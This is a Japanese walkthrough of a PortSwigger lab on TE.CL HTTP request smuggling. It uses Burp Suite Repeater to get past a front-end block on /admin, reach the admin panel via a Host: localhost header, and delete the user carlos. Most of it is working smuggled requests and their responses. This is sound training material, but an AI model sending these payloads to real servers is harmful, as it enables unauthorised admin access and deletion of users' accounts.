# HTTP リクエストの密輸を悪用してフロントエンドのセキュリティ制御、TE.CL の脆弱性をバイパスする

以下のハッキングラボを実施します  
https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl  
このラボにはフロントエンド サーバーとバックエンド サーバーが含まれますが、バックエンド サーバーはチャンク エンコーディングをサポートしていません。

- 1. BurpSuite を起動して、Proxy タブからブラウザを起動します
- 2. ブラウザからハッキングラボにアクセスします
- 3. GET / リクエストを send to repeater します

* 4. GET /admin に書き換えてリクエストを送信します

```
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 24

"Path /admin is blocked"
```

- 5. Repeater のリクエストを表示した状態で右クリックして change to request を選択して、POST リクエストに切り替えます
- 6. inspector で http/1 に設定します
- 7. リクエストを以下のように書き換えて 2 回送信します。

```
POST / HTTP/1.1
Host: 0ad3006a041d606480b8625600ad0033.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

レスポンスでローカルユーザーならアクセスできる情報が得られます

```
Admin interface only available to local users
```

- 8. Host ヘッダーで localhost を指定して、リクエストを 2 回送信します。

```
POST / HTTP/1.1
Host: 0ad3006a041d606480b8625600ad0033.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

レスポンスで一般ユーザーの削除リンクが得られます

```html
<a href="/admin/delete?username=carlos">Delete</a>
```

- 9. アクセス先を変更して、リクエストを 2 回送信します

```
POST / HTTP/1.1
Host: 0ad3006a041d606480b8625600ad0033.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

一般ユーザーの削除に成功しました

```
HTTP/1.1 302 Found
Location: /admin
Set-Cookie: session=Wj4gDHuCUPsmAC6OwVujIwJpnYoBdQST; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 0
```
